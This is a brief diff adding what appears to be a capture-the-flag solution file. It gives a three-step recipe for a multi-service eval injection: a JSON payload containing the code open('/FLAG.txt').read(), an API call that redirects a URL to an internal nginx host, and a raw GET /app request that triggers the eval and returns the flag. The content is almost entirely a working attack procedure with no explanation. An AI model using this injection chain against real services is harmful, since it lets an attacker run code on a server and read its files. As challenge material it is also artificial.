@@ -1,0 +1,4 @@
+# Multi-service eval injection. Steps: 1) /name/set with JSON {"script":"open('/FLAG.txt').read()"}, 2) /api/set?url=http://nginx/names, 3) GET /app triggers eval and returns flag
+
+GET /app HTTP/1.1
+Host: 172.17.0.1:38029
